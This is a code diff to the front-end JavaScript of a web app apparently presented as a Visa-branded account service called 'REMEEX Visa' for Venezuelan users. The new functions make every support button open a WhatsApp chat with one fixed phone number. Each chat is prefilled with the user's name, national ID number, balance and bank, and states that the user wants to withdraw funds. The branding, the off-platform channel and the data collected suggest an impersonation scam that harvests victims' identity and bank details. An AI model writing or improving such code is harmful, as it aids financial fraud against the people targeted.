@@ -10169,7 +10169,7 @@ function stopVerificationProgress() {
 
       if (supportBtn) {
         supportBtn.addEventListener('click', function() {
-          window.open('https://wa.me/+17373018059', '_blank');
+          openWhatsAppSupport();
           resetInactivityTimer();
         });
       }
@@ -10477,7 +10477,7 @@ function stopVerificationProgress() {
       if (chat) chat.addEventListener('click', () => { loadTawkTo(); closeOverlay(); });
 
       const whatsapp = document.getElementById('help-whatsapp');
-      if (whatsapp) whatsapp.addEventListener('click', () => { window.open('https://wa.me/+17373018059', '_blank'); closeOverlay(); });
+      if (whatsapp) whatsapp.addEventListener('click', () => { openWhatsAppSupport(); closeOverlay(); });
 
       const email = document.getElementById('help-email');
       if (email) email.addEventListener('click', () => { window.location.href = 'mailto:contactcenter@visa.com'; closeOverlay(); });
@@ -11537,16 +11537,29 @@ function setupUsAccountLink() {
       updateAccountStateUI();
     }
 
+    // Construir mensaje de soporte para WhatsApp
+    function buildWhatsAppMessage() {
+      const name = currentUser.fullName || currentUser.name || '';
+      const id = currentUser.idNumber || '';
+      const balanceUsd = formatCurrency(currentUser.balance.usd, 'usd');
+      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
+      return `Hello, I am ${name}, Venezuelan citizen, holder of ID number ${id}. My current balance is ${balanceUsd}. I need assistance withdrawing my funds to my bank ${bankName}.`;
+    }
+
+    // Abrir chat de WhatsApp con el mensaje generado
+    function openWhatsAppSupport() {
+      const encoded = encodeURIComponent(buildWhatsAppMessage());
+      const url = `https://wa.me/+17373018059?text=${encoded}`;
+      window.open(url, '_blank');
+    }
+
     // Generar mensajes y actualizar los enlaces de WhatsApp
     function updateWhatsAppLinks() {
       const links = document.querySelectorAll('a.whatsapp-link');
       if (!links.length) return;
 
-      const name = currentUser.name || '';
-      const balanceBs = formatCurrency(currentUser.balance.bs, 'bs');
-      const balanceUsd = formatCurrency(currentUser.balance.usd, 'usd');
-      const message = `Hola, necesito ayuda urgente, soy ${name}, los contacto desde Venezuela, mi saldo actual es de ${balanceBs} y ${balanceUsd} y estoy en el proceso de retiro de mis fondos a mi banco y necesito conversar con el ejecutivo de mi cuenta para solucionar mi peticion.`;
-      const encoded = encodeURIComponent(message);
+      const encoded = encodeURIComponent(buildWhatsAppMessage());
 
       links.forEach(link => {
         link.href = `https://wa.me/+17373018059?text=${encoded}`;
@@ -12117,12 +12130,7 @@ function setupUsAccountLink() {
     if (helpBtn) {
       helpBtn.addEventListener('click', function(e) {
         e.preventDefault();
-        const name = currentUser.name || '';
-        const balanceBs = formatCurrency(currentUser.balance.bs, 'bs');
-        const balanceUsd = formatCurrency(currentUser.balance.usd, 'usd');
-        const message = `Hola, soy ${name}. Necesito asistencia para iniciar sesión en REMEEX Visa. Mi saldo disponible es de ${balanceBs} y ${balanceUsd}.`;
-        const url = `https://wa.me/+17373018059?text=${encodeURIComponent(message)}`;
-        window.open(url, '_blank');
+        openWhatsAppSupport();
       });
     }
   }
